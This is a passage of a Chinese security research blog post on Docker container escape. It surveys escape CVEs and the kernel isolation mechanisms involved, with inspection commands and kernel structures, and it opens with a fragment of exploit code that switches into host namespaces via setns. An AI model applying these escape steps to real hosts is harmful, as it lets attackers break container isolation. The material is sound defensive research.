style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token function" style="color: rgb(215, 58, 73);">setns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token function" style="color: rgb(215, 58, 73);">open</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"/proc/1/ns/net"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">O_RDONLY</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然而实际测试中，发现exp进程的 pid namespace 并未切换成功，具体表现为：</p>
<ul>
<li>通过 <code>echo $$</code> 获得的进程号跟执行exp前没有变化</li>
<li>通过 <code>kill -9</code> 无法终止任何host进程</li>
<li>通过 ls -al /proc/&lt;exp-host-pid&gt;/ns 查看pid项的值也没有发生变化。</li>
</ul>
<p>是什么原因导致只有 pid namespace 切换失败？以及如何完成 pid namespace 的逃逸呢？这篇文章中记录了我对这些问题的理解。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="二docker逃逸历史漏洞及分类">二、Docker逃逸历史漏洞及分类<a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%BA%8Cdocker%E9%80%83%E9%80%B8%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%86%E7%B1%BB" class="hash-link" aria-label="二、Docker逃逸历史漏洞及分类的直接链接" title="二、Docker逃逸历史漏洞及分类的直接链接">​</a></h2>
<p>目前公开的Docker逃逸漏洞可以分为三种类型：Docker配置的问题，Docker实现的问题，和Linux内核的问题。</p>
<ol>
<li>
<p>Docker配置的问题：主要是由于用户使用Docker时不规范，指定了不安全的启动参数（--privileged），给了不必要的启动权限（SYS_MODULE、SYS_PTRACE、SYS_ADMIN），或者挂载了特殊文件（/var/run/docker.sock），基于此可以轻易实现Docker逃逸。</p>
</li>
<li>
<p>Docker实现的问题：Docker架构中各个组件中可能出现一些漏洞，如：</p>
<ul>
<li>runc中的漏洞：CVE-2019-5736、CVE-2024-21626等；</li>
<li>Docker cp/Docker build的漏洞：CVE-2019-14271、CVE-2019-13139等；</li>
<li>containerd的漏洞：CVE-2020-15257等。</li>
</ul>
</li>
<li>
<p>Linux内核的问题：Docker跟host共享同一个系统内核，因此内核中的漏洞也可能被用于容器逃逸。收集了一些用于容器逃逸的漏洞（不一定能用于Docker逃逸，或者即使能用于Docker逃逸也需要满足一些前提条件），如下：</p>
<ul>
<li>通过传统内核漏洞ROP完成逃逸的有：CVE-2017-7308、CVE-2017-1000112、CVE-2020-14386、CVE-2021-22555、CVE-2022-0185；</li>
<li>通过容器机制漏洞完成逃逸的有：CVE-2018-18955（namespace）、CVE-2022-0492（cgroups）；</li>
<li>通过文件读写类漏洞完成逃逸的有：CVE-2016-5195（DirtyCow）、CVE-2022-0847（DirtyPipe）。</li>
</ul>
</li>
</ol>
<p>本文基于传统内核漏洞已实现控制流劫持的场景下（通过植入内核ko实现），研究Docker逃逸过程及利用方法，从而加深对Linux内核中容器安全相关机制的理解。</p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="三docker依赖的内核安全机制">三、Docker依赖的内核安全机制<a href="https://tiangonglab.github.io/blog/tiangongarticle030#%E4%B8%89docker%E4%BE%9D%E8%B5%96%E7%9A%84%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6" class="hash-link" aria-label="三、Docker依赖的内核安全机制的直接链接" title="三、Docker依赖的内核安全机制的直接链接">​</a></h2>
<p>Docker的本质是一个linux用户态进程，它呈现出来的隔离状态依赖于linux内核这个底座提供的几种安全机制 —— capability，namespace，seccomp，apparmor/selinux，cgroups。</p>
<ul>
<li>capability：将普通用户和特权用户进一步区分，实现更细粒度的访问控制；</li>
<li>namespace：资源隔离，使同一namespace中的进程看到相同的系统资源，并且对其他namespace不可见。目前共有8种namespace；</li>
<li>seccomp：禁止进程调用某些系统调用；</li>
<li>apparmor/selinux：强制访问控制；</li>
<li>cgroups：资源限制，限制进程对计算机资源的使用（如CPU、memory、disk I/O、network等）。</li>
</ul>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="31-查看状态">3.1 查看状态<a href="https://tiangonglab.github.io/blog/tiangongarticle030#31-%E6%9F%A5%E7%9C%8B%E7%8A%B6%E6%80%81" class="hash-link" aria-label="3.1 查看状态的直接链接" title="3.1 查看状态的直接链接">​</a></h3>
<p>如何查看当前环境中这些安全机制的状态呢？</p>
<p>在Docker中起一个bash，host上找到它对应的pid号（8089），然后我们可以在系统命令行中观察这些安全机制作用到每个进程的状态。</p>
<ul>
<li>
<p><strong>capability</strong></p>
<p>查看进程具备哪些capability：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">➜  ~ cat /proc/8089/status | grep Cap</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">CapInh: 0000000000000000</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">CapPrm: 00000000a80425fb</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">CapEff: 00000000a80425fb</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">CapBnd: 00000000a80425fb</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">CapAmb: 0000000000000000</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># 通过capsh解析cap</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">➜  ~ capsh --decode=00000000a80425fb</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">WARNING: libcap needs an update (cap=40 should have a name).</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p><strong>namespace</strong></p>
<p>查看进程所属的namespace：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">➜  ~ sudo ls -al /proc/8089/ns/</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">[sudo] password for bling: </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">total 0</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">dr-x--x--x 2 root root 0 4月  26 14:42 .</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">dr-xr-xr-x 9 root root 0 4月  26 14:42 ..</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 cgroup -&gt; 'cgroup:[4026531835]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 ipc -&gt; 'ipc:[4026532705]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 mnt -&gt; 'mnt:[4026532703]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:42 net -&gt; 'net:[4026532707]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 pid -&gt; 'pid:[4026532706]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 pid_for_children -&gt; 'pid:[4026532706]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 time -&gt; 'time:[4026531834]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 time_for_children -&gt; 'time:[4026531834]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 user -&gt; 'user:[4026531837]'</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">lrwxrwxrwx 1 root root 0 4月  26 14:47 uts -&gt; 'uts:[4026532704]'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p><strong>seccomp</strong></p>
<p>查看进程是否被seccomp限制了系统调用：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">➜  ~ cat /proc/8089/status | grep Seccomp</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">Seccomp: 2</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">Seccomp_filters: 1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Seccomp字段数字的含义：</p>
<ul>
<li>为0表示未开启seccomp</li>
<li>为1表示严格模式，只允许进程使用特定的几个系统调用 — sys_read/sys_write/sys_exit</li>
<li>为2表示过滤模式，通过配置文件自定义允许和禁用的系统调用</li>
</ul>
<p>显然，本例中进程seccomp是过滤模式。</p>
</li>
<li>
<p><strong>apparmor/selinux</strong></p>
<p>这两个机制不是针对某个进程的，而是对整个系统生效。</p>
<p>查看系统selinux的状态：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># 三条命令任选其一</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">cat /etc/selinux/config</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">getenforce</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">/usr/sbin/sestatus -v</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>查看系统apparmor的状态：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"># 两条命令任选其一</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">cat /sys/module/apparmor/parameters/enabled</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">sudo apparmor_status</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
</li>
<li>
<p><strong>cgroups</strong></p>
<p>查看进程所属的cgroup：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">➜  ~ cat /proc/8089/cgroup</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">13:perf_event:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">12:cpuset:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">11:pids:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">10:blkio:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">9:rdma:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">8:net_cls,net_prio:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">7:freezer:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">6:hugetlb:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">5:misc:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">4:cpu,cpuacct:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">3:memory:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">2:devices:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">1:name=systemd:/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">0::/Docker/98ad3421a909a1acbd4153f5694657cb7b85439e33876b17b5411b0c4a2f6c3c</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" class="clean-btn" aria-label="切换自动换行" title="切换自动换行"><svg viewBox="0 0 24 24" class="wordWrapButtonIcon_Bwma" aria-hidden="true"><path fill="currentColor" d="M4 19h6v-2H4v2zM20 5H4v2h16V5zm-3 6H4v2h13.25c1.1 0 2 .9 2 2s-.9 2-2 2H15v-2l-3 3l3 3v-2h2c2.21 0 4-1.79 4-4s-1.79-4-4-4z"></path></svg></button><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>如果需要查看或修改资源，可在 <code>/sys/fs/cgroup/</code> 目录中进行。</p>
</li>
</ul>
<h3 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="32-进程角度">3.2 进程角度<a href="https://tiangonglab.github.io/blog/tiangongarticle030#32-%E8%BF%9B%E7%A8%8B%E8%A7%92%E5%BA%A6" class="hash-link" aria-label="3.2 进程角度的直接链接" title="3.2 进程角度的直接链接">​</a></h3>
<p>上述从用户态查看到的状态，都是从内核中读取到的进程数据。所以，可以通过调试Linux内核进程描述符 task_struct 结构体，查看其中存放的当前进程 capability、namespace 和 seccomp 的信息：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">task_struct</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">const</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">cred</span><span class="token plain"> __rcu  </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">cred</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 进程capability信息</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">nsproxy</span><span class="token plain">   </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">nsproxy</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 进程namespace空间</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">seccomp</span><span class="token plain">   seccomp</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 进程seccomp相关</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>各个结构体内容：</p>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color: #393A34; --prism-background-color: #f6f8fa;"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color: rgb(57, 58, 52); background-color: rgb(246, 248, 250);"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">cred</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">kernel_cap_t</span><span class="token plain"> cap_inheritable</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* caps our children can inherit */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">kernel_cap_t</span><span class="token plain"> cap_permitted</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* caps we're permitted */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">kernel_cap_t</span><span class="token plain"> cap_effective</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* caps we can actually use */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">kernel_cap_t</span><span class="token plain"> cap_bset</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* capability bounding set */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">kernel_cap_t</span><span class="token plain"> cap_ambient</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* Ambient capability set */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">/* ... */</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">nsproxy</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">atomic_t</span><span class="token plain"> count</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">uts_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">uts_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">ipc_namespace</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">ipc_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: 